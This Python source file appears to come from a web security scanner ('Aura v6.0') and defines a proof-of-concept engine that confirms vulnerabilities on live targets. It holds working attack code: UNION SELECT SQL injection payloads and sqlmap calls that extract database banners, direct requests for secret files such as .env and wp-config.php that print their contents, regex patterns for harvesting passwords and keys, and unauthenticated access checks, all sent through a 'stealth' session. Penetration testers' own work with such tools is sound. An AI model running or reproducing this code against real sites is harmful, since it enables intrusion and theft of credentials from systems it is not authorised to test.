"""
Aura v6.0 — Deterministic PoC Engine
======================================
Transforms "potential" findings into CONFIRMED exploitations with hard evidence.
Three verification strategies:
  1. SQLi   → Banner extraction via UNION SELECT / sqlmap API
  2. LFI    → Read first 3 lines of accessible sensitive file
  3. Auth   → Screenshot of protected page accessed post-bypass
All confirmed findings get `confirmed=True` and `poc_evidence` field added.
"""
import asyncio
import re
import os
import shutil
from aura.core.stealth import AuraSession, StealthEngine
from rich.console import Console

console = Console()


class PoCEngine:
    """v6.0 Deterministic PoC Engine — turns 'potential' into 'CONFIRMED'."""

    SENSITIVE_PATTERNS = [
        re.compile(r'(?:DB_PASSWORD|SECRET_KEY|AWS_SECRET|api_key|password\s*=\s*|TOKEN)\s*[=:]\s*\S+', re.IGNORECASE),
        re.compile(r'(?:PRIVATE KEY|BEGIN RSA|mysql://|postgres://|mongodb://)', re.IGNORECASE),
    ]

    LFI_PATHS = [
        "/.env", "/.git/config", "/config.php", "/wp-config.php",
        "/docker-compose.yml", "/application.properties", "/settings.py",
        "/.htaccess", "/web.config",
    ]

    def __init__(self, stealth: StealthEngine = None):
        self.stealth = stealth or StealthEngine()
        self.session  = AuraSession(self.stealth)

    # ── 1. SQLi Banner Extraction ──────────────────────────────────────────
    async def verify_sqli(self, url: str, param: str) -> dict | None:
        """
        Try UNION SELECT banner extraction. Falls back to sqlmap API if installed.
        Returns confirmed evidence dict or None.
        """
        console.print(f"[bold cyan][🔬 PoC-SQLi] Verifying SQL Injection on {url} (param={param})...[/bold cyan]")

        # Try sqlmap --api first (non-blocking)
        if shutil.which("sqlmap"):
            try:
                target_url = f"{url}?{param}=1"
                proc = await asyncio.create_subprocess_exec(
                    "sqlmap", "-u", target_url, "--batch", "--banner",
                    "--level=1", "--risk=1", "--output-dir=/tmp/sqlmap_poc",
                    stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
                )
                stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=60)
                output = stdout.decode("utf-8", errors="ignore")
                banner_match = re.search(r'banner:\s*[\'"](.+?)[\'"]', output, re.IGNORECASE)
                if banner_match:
                    banner = banner_match.group(1)
                    console.print(f"[bold green][✔ PoC-SQLi CONFIRMED] DB Banner: {banner}[/bold green]")
                    return {
                        "confirmed": True,
                        "method": "sqlmap --banner",
                        "evidence": f"DB Banner extracted: '{banner}'",
                        "poc_evidence": f"sqlmap confirmed SQL Injection on param '{param}'. DB Banner: {banner}",
                    }
            except (asyncio.TimeoutError, Exception) as e:
                console.print(f"[dim yellow][!] sqlmap attempt failed: {e}. Falling back to UNION SELECT.[/dim yellow]")

        # Python UNION SELECT fallback (already in dast.py)
        payloads = [
            (f"' UNION SELECT 1,@@version,3,4-- -", re.compile(r'(\d+\.\d+\.\d+.*?mysql|MariaDB)', re.IGNORECASE)),
            (f"' UNION SELECT 1,version(),3-- -", re.compile(r'(PostgreSQL[\s\d.]+)', re.IGNORECASE)),
            (f"' UNION SELECT 1,@@servername,3-- -", re.compile(r'(Microsoft SQL Server[\s\d.]+)', re.IGNORECASE)),
        ]
        for payload, pattern in payloads:
            try:
                resp = await self.session.get(url, params={param: payload}, timeout=10)
                match = pattern.search(resp.text)
                if match:
                    banner = match.group(1).strip()
                    console.print(f"[bold green][✔ PoC-SQLi CONFIRMED] DB Banner: {banner}[/bold green]")
                    return {
                        "confirmed": True,
                        "method": "UNION SELECT extraction",
                        "evidence": f"DB Version/Banner: '{banner}'",
                        "poc_evidence": f"UNION SELECT confirmed SQL Injection. Banner: {banner}",
                    }
            except Exception:
                continue
        return None

    # ── 2. LFI / Secret File Read ─────────────────────────────────────────
    async def verify_lfi(self, base_url: str, path: str) -> dict | None:
        """
        Attempt to read the first 3 lines of a sensitive file to confirm LFI/exposure.
        Returns confirmed evidence dict or None.
        """
        console.print(f"[bold yellow][🔬 PoC-LFI] Reading sensitive file: {base_url}{path}[/bold yellow]")
        try:
            resp = await self.session.get(f"{base_url}{path}", timeout=10)
            if resp.status_code == 200 and len(resp.text) > 10:
                lines = [l.strip() for l in resp.text.splitlines() if l.strip()][:3]
                snippet = "\n".join(lines)

                # Check if it actually contains sensitive data
                has_secret = any(p.search(snippet) for p in self.SENSITIVE_PATTERNS)
                sev = "CRITICAL" if has_secret else "HIGH"
                evidence = f"File {path} is readable. First 3 lines:\n{snippet}"
                console.print(f"[bold {'red' if has_secret else 'yellow'}][✔ PoC-LFI CONFIRMED] {evidence}[/bold {'red' if has_secret else 'yellow'}]")
                return {
                    "confirmed": True,
                    "method": "Direct HTTP GET read",
                    "evidence": evidence,
                    "poc_evidence": evidence,
                    "severity": sev,
                }
        except Exception as e:
            console.print(f"[dim red][!] LFI verify failed for {path}: {e}[/dim red]")
        return None

    # ── 3. Auth Bypass Screenshot ─────────────────────────────────────────
    async def verify_auth_bypass(self, protected_url: str, session_cookies: dict = None) -> dict | None:
        """
        Try to access a protected page with current session cookies.
        If accessible (200 OK), screenshost as PoC.
        """
        console.print(f"[bold magenta][🔬 PoC-Auth] Checking access to {protected_url}...[/bold magenta]")
        try:
            resp = await self.session.get(protected_url, cookies=session_cookies or {}, timeout=10)
            if resp.status_code == 200:
                # Attempt screenshot via VisualEye
                try:
                    from aura.modules.vision import VisualEye
                    eye = VisualEye()
                    domain = protected_url.split("/")[2]
                    proof_path = await eye.capture_screenshot(domain, f"poc_auth_bypass_{domain}")
                    screenshot = proof_path.get("screenshot_path") if proof_path else None
                except Exception:
                    screenshot = None

                evidence = f"Protected page {protected_url} returned HTTP 200 without valid authentication."
                console.print(f"[bold red][✔ PoC-Auth CONFIRMED] {evidence}[/bold red]")
                return {
                    "confirmed": True,
                    "method": "HTTP GET without auth",
                    "evidence": evidence,
                    "poc_evidence": evidence,
                    "proof": screenshot,
                    "severity": "CRITICAL",
                }
        except Exception as e:
            console.print(f"[dim red][!] Auth bypass verify failed: {e}[/dim red]")
        return None

    # ── Main orchestrator: verify_all ─────────────────────────────────────
    async def verify_all(self, base_url: str, findings: list) -> list:
        """
        For each finding in the list, attempt deterministic verification.
        Upgrades confirmed findings with poc_evidence field.
        """
        console.print(f"[bold cyan][🔬 PoC Engine] Running deterministic verification on {len(findings)} findings...[/bold cyan]")

        for f in findings:
            f_type    = (f.get("type") or f.get("finding_type") or "").lower()
            content   = f.get("content", "")

            # SQLi verification
            if "sql" in f_type and not f.get("confirmed"):
                url_match = re.search(r'(https?://[^?\s]+)\?(\w+)', content)
                if url_match:
                    result = await self.verify_sqli(url_match.group(1), url_match.group(2))
                    if result:
                        f.update(result)
                        f["severity"] = "CRITICAL"

            # LFI / sensitive file verification
            elif any(k in f_type for k in ("lfi", "disclosure", "leak", "exposure", "path", "secret")) and not f.get("confirmed"):
                # Try to identify the base URL and path from content
                url_match = re.search(r'(https?://[^\s\'"/]+)(/.+?)(?:\s|$)', content)
                if url_match:
                    base = f"{url_match.group(1)}"
                    path = url_match.group(2).split("?")[0]
                    if any(sensitive in path.lower() for sensitive in [".env", ".git", "config", "backup", "secret", "docker", ".svn", "password"]):
                        result = await self.verify_lfi(base, path)
                        if result:
                            f.update(result)

            # Auth Bypass verification
            elif any(k in f_type for k in ("auth", "bypass", "idor", "unauthorized")) and not f.get("confirmed"):
                url_match = re.search(r'(https?://[^\s\'\"]+)', content)
                if url_match:
                    result = await self.verify_auth_bypass(url_match.group(1))
                    if result:
                        f.update(result)

        confirmed_count = sum(1 for f in findings if f.get("confirmed"))
        console.print(f"[green][✔ PoC Engine] {confirmed_count}/{len(findings)} findings CONFIRMED with hard evidence.[/green]")
        return findings
